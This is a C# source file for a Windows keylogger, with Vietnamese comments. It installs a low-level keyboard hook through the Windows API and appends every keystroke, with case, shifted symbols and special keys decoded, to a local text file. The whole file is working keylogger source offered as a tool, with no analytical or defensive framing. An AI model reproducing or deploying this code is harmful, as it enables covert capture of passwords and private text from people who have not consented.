using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace KeyLogger
{
    /// <summary>
    /// Class lưu đường dẫn file log để chia sẻ giữa các luồng
    /// </summary>
    public class appstart
    {
        public static string path = "fileKeyLog.txt";
    }

    /// <summary>
    /// InterceptKeys - Hook bàn phím và ghi log
    /// Sử dụng Low-Level Keyboard Hook của Windows API
    /// </summary>
    public class InterceptKeys
    {
        // ==================== WINDOWS API IMPORTS ====================

        // GetKeyState: Kiểm tra trạng thái Shift/Capslock
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern short GetKeyState(int keyCode);

        // SetWindowsHookEx: Đăng ký hàm hook bàn phím
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        // UnhookWindowsHookEx: Gỡ bỏ hook
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        // CallNextHookEx: Chuyển tiếp sự kiện phím cho các ứng dụng khác (tránh làm đơ phím)
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // ==================== CONSTANTS ====================

        // Hằng số định nghĩa Hook bàn phím mức thấp
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        // ==================== FIELDS ====================

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        // ==================== DELEGATE ====================

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        // ==================== PUBLIC METHODS ====================

        // Hàm khởi động Keylogger
        public static void startKLog()
        {
            _hookID = SetHook(_proc);
            Application.Run(); // Giữ luồng sống
            UnhookWindowsHookEx(_hookID);
        }

        // ==================== PRIVATE METHODS ====================

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        // ==================== HOOK CALLBACK ====================

        // Xử lý sự kiện khi có phím nhấn
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;
                string output = "";

                // Kiểm tra trạng thái Shift và CapsLock để xác định chữ hoa/thường
                bool isShift = (GetKeyState(0x10) & 0x8000) != 0;
                bool isCaps = (GetKeyState(0x14) & 0x0001) != 0;
                bool isUpperCase = isShift ^ isCaps;

                // 1. Xử lý A-Z
                if (key >= Keys.A && key <= Keys.Z)
                {
                    output = key.ToString();
                    if (!isUpperCase) output = output.ToLower();
                }
                // 2. Xử lý số hàng ngang (0-9) và các ký tự đặc biệt (!@#...)
                else if (key >= Keys.D0 && key <= Keys.D9)
                {
                    string s = key.ToString().Replace("D", "");
                    if (isShift)
                    {
                        // Map thủ công các ký tự trên phím số
                        if (s == "1") s = "!";
                        else if (s == "2") s = "@";
                        else if (s == "3") s = "#";
                        else if (s == "4") s = "$";
                        else if (s == "5") s = "%";
                        else if (s == "6") s = "^";
                        else if (s == "7") s = "&";
                        else if (s == "8") s = "*";
                        else if (s == "9") s = "("; else if (s == "0") s = ")";
                    }
                    output = s;
                }
                // 3. Xử lý bàn phím số bên phải (Numpad)
                else if (key >= Keys.NumPad0 && key <= Keys.NumPad9)
                {
                    output = key.ToString().Replace("NumPad", "");
                }
                // 4. Các phím chức năng khác
                else
                {
                    switch (key)
                    {
                        case Keys.Return: output = "\n"; break;
                        case Keys.Space: output = " "; break;
                        case Keys.Back: output = "[BS]"; break;
                        case Keys.Tab: output = "[TAB]"; break;
                        case Keys.Packet:      // Bỏ qua gói tin rác
                        case Keys.ProcessKey:
                            output = "";
                            break;
                        default:
                            output = "[" + key.ToString() + "]";
                            break;
                    }
                }

                // Ghi vào file log
                if (output != "")
                {
                    try
                    {
                        using (StreamWriter sw = File.AppendText(appstart.path))
                        {
                            sw.Write(output);
                        }
                    }
                    catch { }
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }
}